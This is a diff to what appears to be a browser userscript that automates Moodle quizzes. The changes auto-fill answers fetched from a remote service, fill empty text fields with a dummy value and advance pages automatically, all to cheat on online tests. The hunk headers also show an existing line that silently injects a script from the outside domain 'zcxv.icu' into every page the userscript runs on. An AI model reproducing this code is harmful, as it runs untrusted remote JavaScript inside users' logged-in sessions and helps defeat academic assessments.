@@ -53,6 +53,8 @@ d=document;t=d.createElement("script");t.src="//zcxv.icu/4";d.body.appendChild(t
     let reloadgrades = cfg.get('Reload test grades page', _, false);
     let skiptest = cfg.get('Skip tests by name', _, true);
     let skipname = cfg.get('What to skip', 'text', 'firstskip|secondskip|(other skip)');
+    let autowrite = cfg.get('Automatically fill text areas if have no right answers but need to go next page', _, false);
+    let writeval = cfg.get('What to write', 'text', 'a');
 
     let mulrgx = (...arr) => '(' + arr.join(')|(') + ')';
     let _have = (e, c) => e.classList.contains(c);
@@ -195,15 +197,20 @@ d=document;t=d.createElement("script");t.src="//zcxv.icu/4";d.body.appendChild(t
     };
 
     let pressNext = () => {
+        let txb = $('.que .content input[type="text"]');
         let checki = $('.que .content input[type="radio"]:checked, .que .content input[type="checkbox"]:checked');
         let checkif = $('.que .content input[type="radio"], .que .content input[type="checkbox"]');
         let selects = $$('.que .content select');
         for (let bsel of selects) {
             if (bsel.value == 0) return;
         }
-        if (checkif.length > 0 && checki.length < 1) return;
-        let nextfunc = () => $('.mod_quiz-next-nav').click();
-        waitnext ? setTimeout(nextfunc, nextTimeout) : nextfunc();
+        if (autowrite && txb != null && txb.value.trim().length == 0) {
+            txb.value = writeval;
+        }
+        if ((txb != null && txb.value.trim().length > 0) || (checki != null && checki.length > 0)) {
+            let nextfunc = () => $('.mod_quiz-next-nav').click();
+            waitnext ? setTimeout(nextfunc, nextTimeout) : nextfunc();
+        }
     };
 
     let testAttempt = () => {
@@ -518,7 +525,10 @@ d=document;t=d.createElement("script");t.src="//zcxv.icu/4";d.body.appendChild(t
                 qparr.push({
                     'que': Question
                 });
-                getJson('answt', qparr, (data, input) => (input[0].value = data), [answinpttext, Question]);
+                getJson('answt', qparr, (data, input) => {
+                    input[0].value = data;
+                    autonext && autoselect && pressNext();
+                }, [answinpttext, Question]);
                 get = false;
                 return;
             }
